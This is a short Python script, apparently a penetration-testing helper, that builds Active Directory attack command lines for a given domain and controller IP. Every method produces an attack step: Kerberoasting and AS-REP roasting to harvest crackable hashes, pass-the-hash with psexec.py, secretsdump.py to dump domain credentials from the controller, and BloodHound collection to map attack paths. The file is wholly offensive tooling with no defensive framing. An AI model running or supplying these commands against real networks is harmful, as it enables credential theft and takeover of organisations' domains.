import argparse

class ADAttackHelper:
    """Helper to generate Active Directory attack commands."""
    def __init__(self, domain, dc_ip, user=None, password=None):
        self.domain = domain
        self.dc_ip = dc_ip
        self.user = user
        self.password = password

    def get_kerberoast_cmd(self, output_file="hashes.txt"):
        auth = f"{self.domain}/{self.user}:{self.password}" if self.user else f"{self.domain}/"
        return f"GetUserSPNs.py {auth} -dc-ip {self.dc_ip} -request -outputfile {output_file}"

    def get_asreproast_cmd(self, users_file, output_format="hashcat"):
        return f"GetNPUsers.py {self.domain}/ -usersfile {users_file} -dc-ip {self.dc_ip} -format {output_format}"

    def get_pth_cmd(self, target_ip, nt_hash, tool="psexec.py"):
        return f"{tool} {self.domain}/{self.user}@{target_ip} -hashes :{nt_hash}"

    def get_secretsdump_cmd(self):
        return f"secretsdump.py {self.domain}/{self.user}:{self.password}@{self.dc_ip}"

    def get_bloodhound_python_cmd(self, collection_methods="all"):
        return f"bloodhound-python -u '{self.user}' -p '{self.password}' -d {self.domain} -ns {self.dc_ip} -c {collection_methods}"

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="AD Attack Command Generator")
    parser.add_argument("--domain", required=True, help="Domain name")
    parser.add_argument("--dc-ip", required=True, help="DC IP address")
    parser.add_argument("--user", help="Username")
    parser.add_argument("--password", help="Password")
    
    args = parser.parse_args()
    helper = ADAttackHelper(args.domain, args.dc_ip, args.user, args.password)
    
    print("\n--- AD Attack Commands ---")
    print(f"Kerberoast: {helper.get_kerberoast_cmd()}")
    print(f"SecretsDump: {helper.get_secretsdump_cmd()}")
    if args.user and args.password:
        print(f"BloodHound: {helper.get_bloodhound_python_cmd()}")
